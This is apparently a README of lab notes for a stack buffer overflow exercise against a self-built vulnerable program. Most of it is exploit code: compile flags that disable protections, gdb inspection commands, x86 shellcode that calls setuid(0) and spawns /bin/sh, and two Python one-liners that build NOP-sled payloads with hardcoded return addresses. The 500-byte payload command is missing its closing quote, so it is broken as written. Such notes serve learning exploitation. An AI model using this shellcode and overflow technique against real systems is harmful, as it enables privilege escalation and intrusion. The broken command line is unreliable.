# Zen and the Art of Hacking (zataoh)

## Build:
```shell
gcc -g -z execstack -no-pie -o vuln vuln.c
```

buffer lives in between esp and ebp

```shell
info registers
x/30x $esp
x/2x $ebp
```

## Run:
```shell
./envexec.sh vuln $(python ...)
```

## Test if shellcode is working:
(Update test_shellcode with the shellcode you are testing)

### Compile test_shellcode.c
```shell
gcc -m32 -z execstack test_shellcode.c -o test_shell
./test_shellcode
```

## Shellcode (works):
```shell
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
```

## Buffer Size: 100
```shell
./envexec.sh vuln $(python -c 'print "\x90" * 76 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "\x60\xfd\xff\xbf"')
```
## Buffer size: 500
```shell
$(python -c 'print "\x90" * 476 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80" + "\x30\xfa\xff\xbf")
```
